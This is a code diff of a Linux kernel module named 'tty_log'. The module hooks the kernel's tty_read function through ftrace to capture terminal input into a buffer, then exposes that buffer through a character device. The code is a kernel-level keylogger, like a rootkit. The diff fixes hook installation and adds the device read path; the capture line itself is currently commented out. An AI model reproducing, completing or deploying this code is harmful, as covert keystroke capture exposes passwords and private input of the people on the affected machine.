@@ -1,4 +1,7 @@
+#include <asm/segment.h>
+#include <linux/slab.h>
 #include <linux/kernel.h>
+#include <linux/module.h>
 #include <linux/init.h>
 #include <linux/semaphore.h>
 #include <linux/fs.h>
@@ -6,6 +9,8 @@
 #include <linux/kallsyms.h>
 #include <linux/sysfs.h>
 #include <linux/string.h>
+#include <linux/uaccess.h>
+#include <linux/linkage.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hyp");
@@ -13,10 +18,20 @@ MODULE_AUTHOR("hyp");
 #define DEVICE_NAME "tty_log"
 #define SUCCESS 0
 
+#define HOOK(_name, _function, _original) \
+	{									  \
+		.name = (_name),				  \
+		.function = (_function),		  \
+		.original = (_original),		  \
+	}									  \
+
+
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);
+
+int is_open = 0;
 
 static int major;
 
@@ -69,11 +84,18 @@ int install_hook(struct ftrace_hook *hook) {
 		return err;
 
 	hook->ops.func = ftrace_thunk;
-	hook->.flags = FTRACE_OPS_FL_SAVE_REGS
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
 		| FTRACE_OPS_FL_RECURSION_SAFE
 		| FTRACE_OPS_FL_IPMODIFY;
 
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	if(err) {
+		pr_debug("register_ftrace_function() failed: %d\n", err);
+		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		return err;
+	}
+
+	err = register_ftrace_function(&hook->ops);
 	if(err) {
 		pr_debug("register_ftrace_function() failed: %d\n", err);
 		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
@@ -123,30 +145,32 @@ void remove_hooks(struct ftrace_hook *hooks, size_t count) {
 }
 
 static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf,
-		size_t count, loff_t *pos);
+		size_t count, loff_t *ppos);
 
 static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
 		size_t count, loff_t *ppos) {
 
 	ssize_t ret;
 
-	if(strlen(buf) > 0) {
+	pr_info("hittle\n");
+	/*if(strlen(buf) > 0) {
+		pr_info("hit\n");
 		strncat(tty_keybuf, buf, strlen(buf));
-	}
+	}*/
 
 	ret = real_tty_read(file, buf, count, ppos);
 
 	return ret;
 }
 
+static struct ftrace_hook tty_hooks[] = {
+	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
+};
+
 static void kill_ftrace(unsigned long data) {
 	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
 	return;
 }
-
-static struct ftrace_hook tty_hooks[] = {
-	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
-};
 
 static int device_open(struct inode *inode, struct file *file) {
 	if(is_open)
@@ -172,13 +196,40 @@ static ssize_t device_write(struct file *filp, const char __user *buff,
 	return -EINVAL;
 }
 
+static ssize_t device_read(struct file *filp, char __user *buff, size_t len,
+		loff_t *off) {
+
+	int bytes_read = 0;
+
+	if(*msg_ptr == 0)
+		return 0;
+
+	while(len && *msg_ptr) {
+		put_user(*(msg_ptr++), buff++);
+
+		len--;
+		bytes_read++;
+	}
+
+	return bytes_read;
+}
+
 static int __init init_ttylog(void) {
+	int err;
+	
 	tty_keybuf[0] = '\0';
-	sema_init(&sem, 1);
+	//install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
+	//sema_init(&sem, 1);
 
 	major = register_chrdev(0, DEVICE_NAME, &fops);
 	pr_info("ttylog major: %d\n", major);
 
+	err = install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
+	if(err)
+		return err;
+	
+	pr_info("hook installed\n");
+	
 	return 0;
 }
 
@@ -188,4 +239,4 @@ static void __exit cleanup_ttylog(void) {
 }
 
 module_init(init_ttylog);
-module_init(cleanup_ttylog);
+module_exit(cleanup_ttylog);
